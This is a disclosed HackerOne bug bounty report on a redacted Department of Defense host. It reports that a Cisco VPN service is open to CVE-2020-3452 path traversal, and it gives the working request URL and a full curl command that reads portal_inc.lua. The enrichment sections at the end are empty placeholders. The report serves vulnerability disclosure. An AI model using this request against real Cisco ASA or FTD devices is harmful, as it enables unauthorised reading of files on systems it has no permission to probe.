---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '943717'
original_report_id: '943717'
title: '[██████████.mil] Cisco VPN Service Path Traversal'
weakness: Path Traversal
team_handle: deptofdefense
created_at: '2020-07-27T11:47:22.360Z'
disclosed_at: '2020-10-16T19:48:27.895Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 4
tags:
- hackerone
- path-traversal
---

# [██████████.mil] Cisco VPN Service Path Traversal

## Metadata

- HackerOne Report ID: 943717
- Weakness: Path Traversal
- Program: deptofdefense
- Disclosed At: 2020-10-16T19:48:27.895Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi team. 
&nbsp;
# Summary

The Cisco VPN Service at ```██████.mil``` is vulnerable to the CVE-2020-3452 vulnerability, which allows path traversing within the web service's file system on the targeted device.


&nbsp;
# Steps to Reproduce
Make a GET request to:
```http
https://███████.mil/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
```

cURL command:
```
curl -i -s -k -X $'GET' \
    -H $'Host: █████.mil' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://█████.mil/+CSCOE+/logon.html?fcadbadd=1' -H $'DNT: 1' -H $'Connection: close' -H $'Cookie: webvpnlogin=1; webvpnLang=en' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'webvpnlogin=1; webvpnLang=en' \
    $'https://███.mil/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../'
```

..and get the content of the ```portal_inc.lua``` file.
███████

&nbsp;

## Impact

According to Cisco, this vulnerability cannot be used to obtain access to ASA or FTD system files or underlying operating system (OS) files, however, it has a CVE 7.5 (High) score.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
